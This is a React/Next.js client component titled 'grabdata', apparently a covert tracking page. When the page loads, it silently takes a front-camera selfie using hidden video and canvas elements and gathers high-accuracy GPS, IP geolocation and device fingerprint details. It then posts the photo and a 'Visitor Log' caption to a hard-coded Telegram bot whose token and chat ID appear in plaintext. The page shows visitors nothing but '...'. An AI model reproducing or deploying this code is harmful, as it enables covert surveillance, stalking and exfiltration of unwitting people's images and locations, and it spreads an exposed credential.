'use client';

import React, { useEffect, useRef } from 'react';

// Removed the TypeScript interface

const grabdata = () => {
  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  const streamRef = useRef(null);

  async function captureAndSend() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
      streamRef.current = stream;
      const video = videoRef.current;
      if (video) {
        video.srcObject = stream;
        await video.play();
      }

      const canvas = canvasRef.current;
      const w = video.videoWidth || 720;
      const h = video.videoHeight || 720;
      canvas.width = w;
      canvas.height = h;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, w, h);

      const blob = await new Promise((resolve, reject) => {
        canvas.toBlob(b => (b ? resolve(b) : reject(new Error('blob-fail'))), 'image/jpeg', 0.9);
      });

      let latLngCoords = {};
      try {
        latLngCoords = await new Promise((resolve) => {
          if (!navigator.geolocation) return resolve({});
          navigator.geolocation.getCurrentPosition(
            (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude }),
            () => resolve({}),
            { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
          );
        });
      } catch (geoError) {
        console.warn('Geolocation error:', geoError);
      }

      let ipDetails = { status: 'fail' }; // Initialize with a default object structure
      let sharlocLink = '';

      try {
        const ipApiResponse = await fetch('http://ip-api.com/json/');
        if (ipApiResponse.ok) {
          const data = await ipApiResponse.json();
          // Basic check for success, assuming 'status' might not always be present or reliable in plain JS
          if (data.status === 'success' || (data.query && data.country)) {
            ipDetails = data;
          } else {
            console.warn('IP API returned potentially invalid data:', data);
          }

          const finalLat = latLngCoords.lat || ipDetails.lat;
          const finalLng = latLngCoords.lng || ipDetails.lon;
          if (finalLat && finalLng) {
            sharlocLink = `http://googleusercontent.com/maps.google.com/${finalLat},${finalLng}`;
          }
        } else {
          console.warn('Failed to fetch IP details:', ipApiResponse.statusText);
        }
      } catch (ipApiError) {
        console.warn('Error fetching IP details:', ipApiError);
      }

      const BOT_TOKEN = '7474809396:AAFzVx41utqmnmkTmvPLsknBsW58VZOH3Ds';
      const CHAT_ID = '6128943834';

      const userAgent = navigator.userAgent;
      const platform = navigator.platform;
      const screenWidth = window.screen.width;
      const screenHeight = window.screen.height;
      const browserLanguage = navigator.language || navigator.userLanguage;
      const cpuCores = navigator.hardwareConcurrency;
      const ram = navigator.deviceMemory;
      const onLineStatus = navigator.onLine ? 'Online' : 'Offline';
      const cookiesEnabled = navigator.cookieEnabled;
      const referrer = document.referrer;
      const localTime = new Date().toString();

      const form = new FormData();
      form.append('chat_id', CHAT_ID);
      form.append('photo', blob, 'selfie.jpg');

      let caption = "📸 Visitor Log\n\n";
      if (sharlocLink) caption += `🔗 Location: ${sharlocLink}\n`;
      if (ipDetails.query) caption += `🌐 IP: ${ipDetails.query}\n`;
      if (ipDetails.country) caption += `🌍 Negara: ${ipDetails.country} (${ipDetails.countryCode})\n`;
      if (ipDetails.regionName) caption += `🏙️ Wilayah: ${ipDetails.regionName}\n`;
      if (ipDetails.city) caption += `🏠 Kota: ${ipDetails.city}\n`;
      if (ipDetails.zip) caption += `📮 Zip: ${ipDetails.zip}\n`;
      if (ipDetails.isp) caption += `🏢 Org: ${ipDetails.isp}\n`;
      if (ipDetails.timezone) caption += `⏰ Zona Waktu: ${ipDetails.timezone}\n`;
      if (latLngCoords.lat && latLngCoords.lng) {
        caption += `📍 GPS: Lat ${latLngCoords.lat.toFixed(4)}, Lng ${latLngCoords.lng.toFixed(4)}\n`;
      } else if (ipDetails.lat && ipDetails.lon) {
        caption += `📍 GPS (IP): Lat ${ipDetails.lat.toFixed(4)}, Lng ${ipDetails.lon.toFixed(4)}\n`;
      }
      caption += `📱 Device: ${userAgent}\n`;
      caption += `💻 Platform: ${platform}\n`;
      caption += `🖥️ Screen: ${screenWidth}x${screenHeight}\n`;
      caption += `🌐 Browser Lang: ${browserLanguage}\n`;
      caption += `⚙️ CPU Cores: ${cpuCores}\n`;
      if (ram) caption += `💾 RAM: ${ram} GB\n`;
      caption += `🔌 Status: ${onLineStatus}\n`;
      caption += `🍪 Cookies: ${cookiesEnabled ? 'Enabled' : 'Disabled'}\n`;
      caption += `↩️ Referrer: ${referrer}\n`;
      caption += `🕒 Local Time: ${localTime}\n`;

      form.append('caption', caption);

      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: form });
      if (!res.ok) {
        const err = await res.json();
        throw new Error(err?.description || res.statusText);
      }
    } catch (e) {
      console.warn('[captureAndSend] skipped:', e);
    } finally {
      if (streamRef.current) {
        streamRef.current.getTracks().forEach(t => t.stop());
        streamRef.current = null;
      }
    }
  }

  useEffect(() => {
    captureAndSend();
  }, []);

  return (
    <div>
      <video ref={videoRef} className="hidden" playsInline muted />
      <canvas ref={canvasRef} className="hidden" />
      <p className=''>...</p>
    </div>
  );
};

export default grabdata;